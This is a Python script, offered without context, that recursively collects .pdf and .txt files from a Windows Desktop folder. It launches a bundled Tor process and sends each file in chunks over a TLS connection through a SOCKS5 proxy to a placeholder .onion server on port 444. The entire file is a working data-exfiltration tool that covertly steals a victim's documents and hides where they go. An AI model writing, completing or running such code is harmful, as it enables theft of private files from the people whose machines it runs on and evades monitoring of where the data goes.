import ssl, base64, subprocess, socks
from io import BytesIO
from pathlib import Path

# Server's TLS certificate encoded in base64.
CERTIFICATE_BASE64 = "YOUR SERVER TLS CERTIFICATE"

# Function to load a TLS certificate from memory.
def load_certificate_from_memory(base64_cert):
    # Decode the base64-encoded certificate.
    cert_data = base64.b64decode(base64_cert)
    # Wrap the certificate data in a BytesIO object for in-memory operations.
    cert_file = BytesIO(cert_data)
    # Create a default SSL context for server authentication.
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    # Load the certificate into the context using its decoded content.
    context.load_verify_locations(cadata=cert_file.read().decode())
    return context

# Function to search for files with specific extensions in a directory.
def search_files(base_path, extensions):
    base_path = Path(base_path)  # Convert the base path to a Path object.
    matching_files = []  # List to store matching files.
    try:
        # Normalize extensions by stripping whitespace and converting to lowercase.
        extensions = [ext.strip().lower() for ext in extensions]
        # Iterate over extensions and find matching files recursively.
        for ext in extensions:
            for file in base_path.rglob(f"*{ext}"):
                # Add the resolved file path to the list of matches.
                matching_files.append(str(file.resolve()))
    except PermissionError as e:
        # Ignore directories where access is restricted.
        pass
    return matching_files

# Function to start the Tor process.
def start_tor():
    # Launch the Tor executable with the specified SOCKS port.
    tor_process = subprocess.Popen(
        ['.\\tor_windows\\tor.exe', '--SocksPort', '9050'],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    # Read the output of the Tor process until it indicates full initialization.
    for line in iter(tor_process.stdout.readline, ''):
        print(line.strip())  # Print each output line for monitoring.
        if "Bootstrapped 100%" in line:
            break  # Stop reading once the process is fully bootstrapped.

    return tor_process  # Return the Tor process object for later termination.

# Function to terminate the Tor process.
def stop_tor(tor_process):
    tor_process.terminate()  # Gracefully stop the Tor process.

# Function to send a file to a server through a secure connection.
def send_file(server_host, server_port, file_path, ssl_context):
    # Create a SOCKS5 proxy socket.
    sock = socks.socksocket()
    sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)  # Use the local Tor proxy.
    sock.connect((server_host, server_port))  # Connect to the specified server.

    # Wrap the socket in an SSL context for secure communication.
    with ssl_context.wrap_socket(sock, server_hostname=server_host) as secure_sock:
        # Send the file name to the server.
        file_name = Path(file_path).name
        secure_sock.sendall(file_name.encode())  # Encode and send the file name.
        response = secure_sock.recv(1024)  # Wait for a response from the server.
        if response != b"OK":
            return  # Abort if the server doesn't respond with "OK".

        # Send the file in chunks.
        with open(file_path, "rb") as file:
            while chunk := file.read(65536):  # Read the file in 64 KB chunks.
                secure_sock.sendall(chunk)  # Send the chunk.
                response = secure_sock.recv(1024)  # Wait for acknowledgment.
                if response != b"CHUNK_RECEIVED":
                    return  # Abort if the acknowledgment is incorrect.

        # Notify the server that the file transmission is complete.
        secure_sock.sendall(b"EOF")

# Main program logic.
if __name__ == "__main__":
    # Start the Tor process.
    tor_process = start_tor()
    try:
        # Server details.
        server_host = "yourdomain.onion"  # The Onion address of the server.
        server_port = 444  # Port the server is listening on.

        # Load the SSL context with the server's certificate.
        ssl_context = load_certificate_from_memory(CERTIFICATE_BASE64)

        # Directory to search for files and file extensions to include.
        dir_path = "C:/user/Desktop"  # Directory to scan for files.
        extensions = ".pdf, .txt".split(",")  # List of file extensions to search for.

        # Search for files matching the criteria.
        files_to_send = search_files(dir_path, extensions)

        # Send each matching file to the server.
        for file_path in files_to_send:
            send_file(server_host, server_port, file_path, ssl_context)

    finally:
        # Ensure the Tor process is terminated when the program exits.
        stop_tor(tor_process)
